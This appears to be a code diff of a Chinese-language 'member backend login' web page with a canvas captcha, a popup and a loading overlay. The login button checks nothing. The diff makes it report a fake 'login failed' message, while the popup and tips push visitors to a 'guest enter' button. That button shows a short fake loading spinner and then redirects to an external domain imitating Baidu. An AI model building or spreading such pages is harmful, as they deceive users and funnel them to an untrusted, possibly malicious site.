@@ -18,28 +18,37 @@ button{flex:1;height:40px;border:none;border-radius:3px;font-size:15px;color:#ff
 #guestBtn{background:#ff9600}
 button:active{filter:brightness(108%)}
 #tip{margin-top:12px;font-size:14px;color:#d32f2f;font-weight:600;text-align:center}
-/* footer */
 footer{margin-top:22px;font-size:12px;line-height:1.6;text-align:center;color:#9a9a9a}
 footer a{color:#9a9a9a;text-decoration:none}
-/* ── 弹窗 ── */
+
+/* ——首次—— */
 #overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);display:flex;justify-content:center;align-items:center;z-index:999}
 #popup{background:#fff;border-radius:8px;padding:26px 20px;text-align:center;width:84%;max-width:320px;box-shadow:0 4px 15px rgba(0,0,0,.18)}
 #popup h3{font-size:18px;color:#333;margin-bottom:16px}
 #popup p{font-size:14px;color:#666;margin-bottom:22px;line-height:1.6}
 #closeBtn{width:100%;background:#2685c5;border:none;border-radius:4px;color:#fff;font-size:15px;padding:10px 0;cursor:pointer}
 #closeBtn:active{filter:brightness(108%)}
+
+/* ——加载—— */
+#loading{position:fixed;inset:0;background:rgba(0,0,0,.45);display:none;justify-content:center;align-items:center;z-index:998}
+#loading span{background:#2685c5;color:#fff;padding:12px 26px;border-radius:30px;font-size:15px;display:flex;align-items:center;gap:8px}
+#loading i{width:10px;height:10px;border-radius:50%;background:#fff;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.6;transform:scale(1.5)}}
 </style>
 </head>
 <body>
 
-<!-- 提示-->
+<!-- 进入 -->
 <div id="overlay">
   <div id="popup">
     <h3>温馨提示</h3>
-    <p>如您没有会员账号，可直接点击<br><b>【访客进入】</b> </p>
+    <p>如您没有会员账号，可直接点击<br><b>【访客进入】</b></p>
     <button id="closeBtn">我已了解</button>
   </div>
 </div>
+
+<!-- 加载 -->
+<div id="loading"><span><i></i> 正在加载…</span></div>
 
 <div id="panel">
   <h2>会员后台登录</h2>
@@ -66,17 +75,17 @@ footer a{color:#9a9a9a;text-decoration:none}
 </footer>
 
 <script>
-const TARGET_URL="https://d99s1-fjkmm1.baidnnra1.146n.baby";
+const TARGET_URL="https://d99s1-fjkmm1.baidnnra1.146n.baby";   // 访客
 const CODE_LEN=5;
 
-/* 关闭 */
+/* 关闭*/
 document.getElementById("closeBtn").onclick=
 document.getElementById("overlay").onclick=e=>{
   if(e.target===e.currentTarget||e.target.id==="closeBtn")
     e.currentTarget.style.display="none";
 };
 
-/* 验证码 */
+/* 简易*/
 const cvs=document.createElement("canvas");cvs.width=120;cvs.height=40;
 const ctx=cvs.getContext("2d");
 const R=(a,b)=>Math.floor(Math.random()*(b-a)+a);
@@ -95,14 +104,18 @@ function drawCap(){
 }
 document.getElementById("capImg").onclick=drawCap;drawCap();
 
-/* 访客进入 */
-document.getElementById("guestBtn").onclick=()=>location.href=TARGET_URL;
+/* 访客进入：加载 → 0.8 s */
+document.getElementById("guestBtn").onclick=()=>{
+  const load=document.getElementById("loading");
+  load.style.display="flex";
+  setTimeout(()=>{load.style.display="none";location.href=TARGET_URL;},800);
+};
 
-/* 登录仅刷新验证码并提示 */
+/* 登录按钮*/
 document.getElementById("loginBtn").onclick=()=>{
   drawCap();
   const t=document.getElementById("tip");
-  t.textContent="验证码已刷新；如无账号请选择访客进入";
+  t.textContent="登陆失败；如无账号请选择访客进入";
   setTimeout(()=>t.textContent="👉 无账号? 请选择 访客进入",2500);
 };
 </script>
